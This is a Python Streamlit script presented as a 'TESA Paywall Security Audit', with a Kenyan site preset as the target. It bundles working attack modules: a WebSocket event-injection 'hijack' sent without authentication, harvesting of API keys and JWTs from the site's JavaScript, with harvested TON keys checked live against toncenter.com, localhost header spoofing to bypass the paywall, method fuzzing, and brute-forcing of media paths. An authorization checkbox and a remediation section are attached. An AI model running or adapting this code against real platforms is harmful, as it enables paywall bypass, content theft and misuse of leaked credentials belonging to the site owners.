import re
import time
import concurrent.futures
import json
from urllib.parse import urljoin, urlparse

import requests
import streamlit as st
from bs4 import BeautifulSoup
import websocket

# ==========================================
# CONFIGURATION & PAYLOADS
# ==========================================
UUID_REGEX = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.IGNORECASE)
TON_KEY_REGEX = re.compile(r"apikey\s+([a-f0-9]{64})", re.IGNORECASE)

REQUEST_TIMEOUT = 10
BASE_HEADERS = {"User-Agent": "TESA-Security-Auditor/4.0"}

AUTH_KEYWORDS = ["log in", "login", "sign in", "sign up", "unauthorized", "payment required"]

BYPASS_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Original-URL": "/admin"
}

# Phoenix LiveView WebSocket Exploit Payloads
# Format: [join_ref, ref, topic, event, payload]
# Reference: https://hexdocs.pm/phoenix/writing_a_channels_client.html
def build_liveview_payload(join_ref, ref, topic, event, payload):
    return json.dumps([join_ref, ref, topic, event, payload])

MEDIA_PATHS = [
    "uploads/videos/{uuid}.mp4", "uploads/videos/{uuid}.m3u8",
    "media/{uuid}.mp4", "media/{uuid}.m3u8", "videos/{uuid}.mp4",
    "videos/{uuid}.m3u8", "uploads/{uuid}.mp4", "uploads/{uuid}.m3u8",
    "stream/{uuid}.m3u8", "hls/{uuid}/playlist.m3u8", "dash/{uuid}/manifest.mpd",
    "api/v1/videos/{uuid}", "api/videos/{uuid}/stream", "storage/videos/{uuid}.mp4",
    "assets/videos/{uuid}.mp4"
]

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def normalize_root(raw_url: str) -> str:
    parsed = urlparse(raw_url.strip())
    return f"{parsed.scheme}://{parsed.netloc}"

def build_url(root: str, path: str) -> str:
    return urljoin(root + "/", path.lstrip("/"))

def make_session(cookie="", auth=""):
    s = requests.Session()
    s.headers.update(BASE_HEADERS)
    if cookie: s.headers["Cookie"] = cookie
    if auth: s.headers["Authorization"] = auth
    return s

def safe_request(session, method, url, headers=None, allow_redirects=True):
    try:
        req_headers = session.headers.copy()
        if headers: req_headers.update(headers)
        resp = session.request(method, url, headers=req_headers, timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)
        return resp, None
    except Exception as e:
        return None, str(e)

def scan_for_auth_wall(resp):
    try:
        text = resp.text.lower()
        for kw in AUTH_KEYWORDS:
            if kw in text: return True
    except: pass
    return False

# ==========================================
# AGGRESSIVE ATTACK MODULES
# ==========================================

def module_liveview_websocket_hijack(session, root, uuid):
    """
    Simulates CVE-2026-55571: Unauthenticated WebSocket event injection.
    Attempts to join a LiveView topic and send an "unlock" event without auth.
    """
    parsed = urlparse(root)
    ws_url = f"wss://{parsed.netloc}/live/websocket?vsn=2.0.0"
    results = []

    try:
        # Attempt connection without cookies or CSRF
        ws = websocket.create_connection(ws_url, timeout=5)
        
        # 1. Send phx_join to a likely LiveView topic (usually "lv:phx-..." or "phoenix")
        # In LiveView, the topic is often the root PID or a session-based ID.
        # For a generic attack, we try to join "phoenix" or a placeholder topic.
        join_ref = "1"
        ref = "1"
        topic = "phoenix"  # Common default topic, though LiveView may use specific PIDs.
        event = "phx_join"
        payload = {}
        
        join_msg = build_liveview_payload(join_ref, ref, topic, event, payload)
        ws.send(join_msg)
        
        # Wait for a reply (optional, but helps confirm if the socket is alive)
        try:
            reply = ws.recv()
        except:
            reply = None

        # 2. Send the malicious event to unlock the video
        # We use the UUID as a payload parameter to simulate fetching content.
        # The event name "unlock_video" or "play" is a guess; attackers often fuzz these.
        malicious_payload = {"video_id": uuid, "id": uuid}
        event_msg = build_liveview_payload(join_ref, "2", topic, "unlock_video", malicious_payload)
        ws.send(event_msg)
        
        # Check if we get a data payload back (indicates success)
        try:
            data_reply = ws.recv()
            if data_reply and ("video" in data_reply.lower() or "url" in data_reply.lower()):
                verdict = "CRITICAL"
                detail = "WebSocket accepted phx_join and responded to event injection. Unauthorized content access likely."
            else:
                verdict = "HIGH"
                detail = "WebSocket accepted connection and phx_join without auth. Event injection sent, no immediate payload."
        except:
            verdict = "HIGH"
            detail = "WebSocket accepted connection and phx_join without auth. (No response to injected event)."

        ws.close()
        results.append({
            "module": "LiveView WebSocket Hijack",
            "target": ws_url,
            "status": "101 Switching Protocols",
            "verdict": verdict,
            "detail": detail
        })

    except Exception as e:
        results.append({
            "module": "LiveView WebSocket Hijack",
            "target": ws_url,
            "status": None,
            "verdict": "SECURE",
            "detail": f"Connection rejected or failed: {str(e)[:80]}"
        })
    
    return results

def module_js_secret_scanner(session, root):
    """Scans JS files for leaked API keys (e.g., TON, Stripe, AWS)."""
    results = []
    target_url = build_url(root, "users/log-in")
    resp, _ = safe_request(session, "GET", target_url)
    if not resp: return results

    soup = BeautifulSoup(resp.text, "html.parser")
    js_files = [script['src'] for script in soup.find_all('script', src=True)]
    
    if not any("image.js" in js for js in js_files):
        js_files.append("/js/image.js")

    leaked_keys = []

    for js_path in js_files:
        js_url = js_path if js_path.startswith("http") else build_url(root, js_path)
        js_resp, _ = safe_request(session, "GET", js_url)
        if not js_resp or js_resp.status_code != 200: continue

        ton_matches = TON_KEY_REGEX.findall(js_resp.text)
        for key in ton_matches:
            leaked_keys.append({"type": "TON API Key", "key": key, "source": js_url})
            
        jwt_matches = re.findall(r'(eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*)', js_resp.text)
        for key in set(jwt_matches):
             if len(key) > 50:
                 leaked_keys.append({"type": "JWT/Token", "key": key, "source": js_url})

    for item in leaked_keys:
        if item["type"] == "TON API Key":
            ton_api_url = "https://toncenter.com/api/v2/getAddressInformation"
            params = {"address": "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c", "api_key": item["key"]}
            try:
                api_resp = requests.get(ton_api_url, params=params, timeout=5)
                verdict = "CRITICAL" if api_resp.status_code == 200 else "HIGH"
                detail = f"TON API Key leaked in {item['source']}. {'Active' if api_resp.status_code == 200 else 'Revoked'}."
            except:
                 verdict = "HIGH"
                 detail = f"TON API Key leaked in {item['source']} (could not verify)."
        else:
            verdict = "CRITICAL"
            detail = f"Sensitive {item['type']} leaked in {item['source']}."

        results.append({"module": "JS Secret Leakage", "target": item['source'], "status": "N/A", "verdict": verdict, "detail": detail})

    return results

def module_header_spoofing(session, root, uuid):
    """Tests if spoofing localhost headers bypasses the paywall."""
    url = build_url(root, f"unlock/{uuid}")
    results = []
    
    resp, err = safe_request(session, "GET", url, headers=BYPASS_HEADERS, allow_redirects=False)
    if err: 
        return [{"module": "Header Spoofing", "target": url, "status": None, "verdict": "ERROR", "detail": err}]
    
    if resp.status_code == 200 and not scan_for_auth_wall(resp):
        verdict, detail = "CRITICAL", "Bypass Headers (X-Forwarded-For) successfully served content!"
    else:
        verdict, detail = "SECURE", f"Headers ignored or blocked ({resp.status_code})."
        
    results.append({"module": "Header Spoofing (127.0.0.1)", "target": url, "status": resp.status_code, "verdict": verdict, "detail": detail})
    
    for method in ["POST", "OPTIONS"]:
        resp_m, _ = safe_request(session, method, url, allow_redirects=False)
        if resp_m and resp_m.status_code == 200:
            results.append({"module": f"Method Fuzzing ({method})", "target": url, "status": 200, "verdict": "HIGH", "detail": f"{method} returned 200 OK. Might allow unauthorized mutations."})
            
    return results

def module_concurrent_media_fuzzing(session, root, uuid):
    """Simultaneously tries 15+ media paths."""
    results = []
    
    def check_path(path_template):
        path = path_template.format(uuid=uuid)
        url = build_url(root, path)
        resp, err = safe_request(session, "HEAD", url)
        if err or not resp: return None
        
        if resp.status_code == 200:
            verdict = "CRITICAL"
            detail = f"Direct {path.split('.')[-1].upper()} access without auth!"
        elif resp.status_code == 429:
            verdict = "WAF DETECTED"
            detail = "429 Too Many Requests. Rate limiting is active."
        else:
            return None
            
        return {"module": "Media Fuzzing", "target": url, "status": resp.status_code, "verdict": verdict, "detail": detail}

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_path, path) for path in MEDIA_PATHS]
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            if res: results.append(res)
            
    return results

def module_preview_unlock_bypass(session, root, uuid):
    """Basic check for preview image and direct unlock page access."""
    results = []
    url_prev = build_url(root, f"posts/{uuid}/preview.jpg")
    resp_prev, _ = safe_request(session, "GET", url_prev)
    if resp_prev and resp_prev.status_code == 200 and not scan_for_auth_wall(resp_prev):
        results.append({"module": "Preview Leak", "target": url_prev, "status": 200, "verdict": "HIGH", "detail": "Paywalled preview image served to anonymous user."})

    url_unlock = build_url(root, f"unlock/{uuid}")
    resp_unlock, _ = safe_request(session, "GET", url_unlock, allow_redirects=False)
    if resp_unlock and resp_unlock.status_code == 200 and not scan_for_auth_wall(resp_unlock):
        results.append({"module": "Paywall Bypass", "target": url_unlock, "status": 200, "verdict": "CRITICAL", "detail": "Unlock page served raw content without login."})
        
    return results


# ==========================================
# STREAMLIT UI
# ==========================================
def main():
    st.set_page_config(page_title="TESA Security Audit", page_icon="🛡️", layout="wide")
    
    st.title("🛡️ TESA Paywall Security Audit")
    st.markdown("""
    **This tool simulates advanced adversarial attacks** against the TESA platform to identify access-control flaws, secret leakage, and paywall bypasses.
    """)
    
    st.error("⚠️ **AUTHORIZED TESTING ONLY.** By running this tool, you confirm you are the owner or have explicit permission to test the target domain.")

    with st.sidebar:
        st.header("Target Configuration")
        target_url = st.text_input("Target URL", value="https://tesa.co.ke")
        manual_uuid = st.text_input("Specific UUID (Optional)", placeholder="b6aa8a10...")
        
        st.subheader("Authentication (Optional)")
        cookie_val = st.text_area("Cookie Header", height=68)
        auth_val = st.text_input("Auth Bearer Token")
        
        authorized = st.checkbox("I confirm I have authorization")
        run_btn = st.button("🚀 Run Security Audit", type="primary", disabled=not authorized, use_container_width=True)

    if run_btn:
        root = normalize_root(target_url)
        session = make_session(cookie_val, auth_val)
        
        all_results = []
        
        with st.spinner("Initiating attack sequence..."):
            # 1. Discovery
            resp_posts, _ = safe_request(session, "GET", build_url(root, "posts"))
            uuids = list(set(UUID_REGEX.findall(resp_posts.text))) if resp_posts else []
            test_uuid = manual_uuid or (uuids[0] if uuids else "b6aa8a10-2f4a-4004-a824-8983f00b26c0")
            
            # 2. JS Secret Scanning
            all_results.extend(module_js_secret_scanner(session, root))
            
            # 3. LiveView WebSocket Hijack (Most Critical)
            all_results.extend(module_liveview_websocket_hijack(session, root, test_uuid))
            
            # 4. Header Spoofing & Method Fuzzing
            all_results.extend(module_header_spoofing(session, root, test_uuid))
            
            # 5. Preview & Unlock Checks
            all_results.extend(module_preview_unlock_bypass(session, root, test_uuid))
            
            # 6. Concurrent Media Fuzzing
            all_results.extend(module_concurrent_media_fuzzing(session, root, test_uuid))

        # --- REPORTING ---
        st.markdown("---")
        st.header("📊 Executive Summary")
        
        crit = sum(1 for r in all_results if r["verdict"] == "CRITICAL")
        high = sum(1 for r in all_results if r["verdict"] == "HIGH")
        
        col1, col2, col3 = st.columns(3)
        col1.metric("Critical Risks", crit, delta="Immediate Action" if crit > 0 else None, delta_color="inverse")
        col2.metric("High Risks", high, delta="Fix Soon" if high > 0 else None, delta_color="inverse")
        col3.metric("Targeted UUID", test_uuid[:8] + "...", help="The video ID used for testing.")
        
        if crit > 0 or high > 0:
            st.error(f"🚨 **Vulnerabilities Detected:** The platform is currently exposed to unauthorized access and potential data leakage. Hiring a dedicated white-hat team is highly recommended.")
        else:
            st.success("✅ **Baseline Secure:** No obvious critical flaws detected in this automated pass. (Note: Manual pentesting is still required).")

        st.header("🔍 Detailed Findings")
        
        if not all_results:
            st.info("No vulnerabilities found in this automated sequence.")
        
        for r in all_results:
            if r["verdict"] == "SECURE": continue
            
            color = {"CRITICAL": "#c0392b", "HIGH": "#e67e22", "WAF DETECTED": "#f1c40f"}.get(r["verdict"], "#7f8c8d")
            
            st.markdown(f"""
            <div style="border-left: 5px solid {color}; padding-left: 15px; margin-bottom: 20px;">
                <h4 style="margin:0; color:{color};">[{r['verdict']}] {r['module']}</h4>
                <p style="margin:5px 0;"><strong>Target:</strong> <code>{r['target']}</code></p>
                <p style="margin:5px 0;"><strong>HTTP Status:</strong> {r['status']}</p>
                <p style="margin:5px 0;"><strong>Details:</strong> {r['detail']}</p>
            </div>
            """, unsafe_allow_html=True)

        st.header("🛠️ Remediation Plan (For Stakeholders)")
        st.markdown("""
        To secure the TESA platform, the following architectural changes must be prioritized:
        
        1. **Move Secrets to the Backend:** The frontend JavaScript is leaking critical API keys (e.g., TON Center). These must be stored in Elixir environment variables (`.env`), and all third-party API calls must be proxied through the Phoenix backend.
        2. **Harden LiveView WebSockets:** Ensure that the `connect/3` and `handle_event/3` callbacks in your Phoenix socket module verify the user's authorization state. Do not rely solely on `mount/3` redirects. Explicitly close the socket if the user is unauthorized.
        3. **Implement Signed URLs for Media:** Do not serve video assets (`/uploads/...` or `/media/...`) directly. Generate short-lived (e.g., 2-minute) signed URLs using your CDN (Cloudflare, AWS CloudFront) only *after* a user's subscription is verified.
        4. **Fix Reverse Proxy Trust:** If the app is behind Nginx/Cloudflare, ensure it strips incoming `X-Forwarded-For` headers from the public internet to prevent header spoofing bypasses.
        """)

if __name__ == "__main__":
    main()